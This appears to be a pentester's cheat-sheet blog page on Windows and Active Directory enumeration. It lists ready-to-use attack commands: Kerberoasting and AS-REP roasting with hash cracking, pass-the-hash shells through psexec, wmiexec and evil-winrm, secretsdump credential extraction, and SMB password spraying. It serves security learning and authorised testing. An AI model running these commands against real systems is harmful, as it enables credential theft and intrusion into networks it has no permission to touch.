---
title: 3. Enumeration - Windows
categories:
  - Pentesting
  - Windows
tags:
  - Pentesting
  - Windows
  - Enumeration
toc: true
---

---
Step 3 in a penetration test: Enumeration.
Try to find relevant info to enter the target machine.

---
<!-- more -->

## Active Directory

### Impacket scripts

#### GetADUsers.py
  - gather data about the domain's users and their corresponding email addresses
```bash
GetADUsers.py -all $domain/$username -dc-ip $IP
```

<br>

#### GetUserSPNs.py
  - fetch Service Principal Names that are associated with normal user accounts
  - give a ticket encrypted with the user account's password that we can crack.

```bash 
GetUserSPNs.py -request -dc-ip $IP $domain/$user -save -outputfile GetUserSPNs.out
```
```bash Crack krb5tgs ticket
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

<br>

#### GetNPUsers.py
  - retrieve domain users who have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords

```bash
python3 GetNPUsers.py $domain/ -dc-ip $IP -usersfile users.txt -format hashcat -outputfile hashes.txt
```

<br>

#### PSExec.py
  - psexec like functionality; shell on the Windows host

```bash
psexec.py $domain/$user:$pass@$IP

psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP
```

<br>

#### WMIexec.py
  - execute commands through WMI, similar to `smbexec.py`
  - runs under user (must be Admin) and is not noisy (as smbexec.py)
  - drawback: needs DCOM - access to DCOM ports

```bash
wmiexec.py 'administrator:$pass@$IP'

wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip $IP administrator@$IP
```

<br>

#### Secretsdump.py
 - dump hashes from the remote machine
 - for SAM and LSA Secrets (including cached creds) read as much from the hives
 - from NTDS.dit extract domain users, hashes, kerberos keys

```bash
# mounted Share in Windows/System32/config
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

<br>

#### MsSQLclient.py
- authenticate and run commands in a MSSQL server

```bash 
mssqlclient.py $user:'$pass'@$IP -windows-auth
```

<br>





## Services by ports

### Port 139/TCP,445/TCP - SMB
```bash
enum4linux -a $IP
```
```bash
# recursively list all files in available shares
smbmap -H $IP -R

smbmap -H $IP -d $domain -u "$user" -p "$pass"
```
```bash
# connect to share without a password
smbclient //$IP/Share_name -U ""%""

# connect to share with username and password
smbclient //$IP/Share_name -U $domain\\$user%$pass
```
```bash
crackmapexec smb $IP -u users -p users --continue-on-success
```

<br>

### Port 139/TCP,445/TCP - NetBIOS,SMB
```bash Authenticate with Impacket script - mssqlclient
mssqlclient.py $user:'$pass'@$IP -windows-auth
```

<br>

### Port 161/UDP - SNMP
Normal enumeration
```bash
snmpwalk -v 2c -c public $IP
```
Enable MIB support - translate OIDs (Object Identifiers)
> comment out the only uncommented line to use the mibs
```bash
sudo apt install snmp-mibs-downloader
sudo nano /etc/snmp/snmp.conf
```

```bash hrSWRunTable: Retrieves detailed information about all running processes
snmpwalk -v 2c -c public $IP hrSWRunTable
# included information:
#   - hrSWRunIndex: Unique index for each running process.
#   - hrSWRunName: Name of each running process.
#   - hrSWRunID: Unique ID of the process.
#   - hrSWRunPath: Full path to the executable file of the process.
#   - hrSWRunParameters: Command-line parameters used to start the process.
#   - hrSWRunType: Type of process (e.g., application, system).
```

<br>

### Port 389/TCP,UDP - LDAP
```bash
ldapsearch -x -h $IP -s base namingcontexts
# -x              simple auth
# -s base         set the scope base
# namingcontext   return naming contexts

ldapsearch -x -h $IP -b 'DC=$domain,DC=LOCAL'
```

<br>

### Port 5985/TCP,5986/TCP - WinRM
```bash
crackmapexec winrm $IP -u $user -p '$pass'
```
```bash
evil-winrm -i $IP -u $user -p '$pass'

evil-winrm -i $IP -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```

<br>

---
---